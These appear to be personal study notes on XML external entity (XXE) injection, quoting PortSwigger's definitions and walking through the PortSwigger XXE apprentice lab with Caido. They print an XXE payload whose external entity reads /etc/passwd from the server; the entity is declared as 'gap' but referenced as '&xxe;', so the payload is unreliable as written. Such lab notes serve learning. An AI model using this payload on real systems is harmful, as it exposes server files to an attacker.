
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
-Portswigger- https://portswigger.net/web-security/xxe

Background 

XML, Extensible Markup Langauge is  is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.
-Portswigger- https://portswigger.net/web-security/xxe/xml-entities


Code Academy, introduction to XML
https://www.youtube.com/watch?v=O7fmNwbtCjo

Data flow from Server to client and client to server via JSON and XML

**Portswigger XXE Lab: Apprentice**

Sign in and start the lab

![[PEN-200/XXE Portswigger/1.png]]

Start Caido and look for the post request once you use the "checkstock" button on the website.

![[2a.png]]

Create a system call:
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY gap SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```

then replace the productID with your call:
```&gap```

![[PEN-200/XXE Portswigger/2.png]]

![[PEN-200/XXE Portswigger/3.png]]

Yay!